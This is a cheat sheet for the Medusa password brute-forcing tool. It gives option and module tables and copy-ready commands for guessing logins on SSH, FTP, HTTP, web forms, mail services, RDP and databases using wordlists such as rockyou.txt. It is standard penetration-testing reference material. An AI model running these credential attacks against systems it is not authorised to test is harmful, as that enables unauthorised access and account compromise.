# Medusa

Fast, parallel, modular login brute-forcer.

## Installation

```bash
sudo apt-get -y install medusa
```

---

## Basic Syntax

```bash
medusa [target_options] [credential_options] -M module [module_options]
```

---

## Options Table

| Option | Description | Example |
|--------|-------------|---------|
| `-h HOST` | Single target host | `medusa -h 192.168.1.10 ...` |
| `-H FILE` | File with list of targets | `medusa -H targets.txt ...` |
| `-u USER` | Single username | `medusa -u admin ...` |
| `-U FILE` | File with list of usernames | `medusa -U users.txt ...` |
| `-p PASS` | Single password | `medusa -p password123 ...` |
| `-P FILE` | File with list of passwords | `medusa -P passwords.txt ...` |
| `-M MODULE` | Module to use | `medusa -M ssh ...` |
| `-m "OPTS"` | Module-specific options | `medusa -m "DIR:/admin" ...` |
| `-t TASKS` | Parallel login attempts | `medusa -t 4 ...` |
| `-f` | Stop after first valid login (host) | `medusa -f ...` |
| `-F` | Stop after first valid login (any) | `medusa -F ...` |
| `-n PORT` | Non-default port | `medusa -n 2222 ...` |
| `-e ns` | Check empty/same-as-user passwords | `medusa -e ns ...` |
| `-v LEVEL` | Verbose (0-6) | `medusa -v 4 ...` |

---

## Modules Table

| Module | Service | Example |
|--------|---------|---------|
| `ssh` | SSH | `medusa -M ssh -h 192.168.1.100 -u root -P pass.txt` |
| `ftp` | FTP | `medusa -M ftp -h 192.168.1.100 -u admin -P pass.txt` |
| `http` | HTTP Basic Auth | `medusa -M http -h example.com -U users.txt -P pass.txt` |
| `mysql` | MySQL | `medusa -M mysql -h 192.168.1.100 -u root -P pass.txt` |
| `mssql` | MS SQL Server | `medusa -M mssql -h 192.168.1.100 -u sa -P pass.txt` |
| `rdp` | Remote Desktop | `medusa -M rdp -h 192.168.1.100 -u admin -P pass.txt` |
| `vnc` | VNC | `medusa -M vnc -h 192.168.1.100 -P pass.txt` |
| `pop3` | POP3 Mail | `medusa -M pop3 -h mail.example.com -U users.txt -P pass.txt` |
| `imap` | IMAP Mail | `medusa -M imap -h mail.example.com -U users.txt -P pass.txt` |
| `smtp` | SMTP Mail | `medusa -M smtp -h mail.example.com -U users.txt -P pass.txt` |
| `telnet` | Telnet | `medusa -M telnet -h 192.168.1.100 -u admin -P pass.txt` |
| `web-form` | Web Login Forms | See below |

---

## SSH Brute Force

```bash
medusa -h 192.168.1.100 -u root -P /usr/share/wordlists/rockyou.txt -M ssh -t 4

# With username list
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh
```

---

## FTP Brute Force

```bash
medusa -h 192.168.1.100 -u ftpuser -P passwords.txt -M ftp -t 5

# Local FTP (use 127.0.0.1 to force IPv4)
medusa -h 127.0.0.1 -u ftpuser -P passwords.txt -M ftp
```

---

## HTTP Basic Auth

```bash
medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET
```

---

## Web Form Brute Force

```bash
medusa -h www.example.com -U users.txt -P passwords.txt -M web-form \
       -m FORM:"username=^USER^&password=^PASS^:F=Invalid"
```

---

## Multiple Targets

```bash
medusa -H targets.txt -u admin -P passwords.txt -M ssh -t 4
```

---

## Check Empty/Default Passwords

```bash
# -e n = try empty password
# -e s = try password same as username
# -e ns = try both
medusa -h 192.168.1.100 -U users.txt -e ns -M ssh
```

---

## Non-Standard Port

```bash
medusa -h 192.168.1.100 -n 2222 -u root -P passwords.txt -M ssh
```
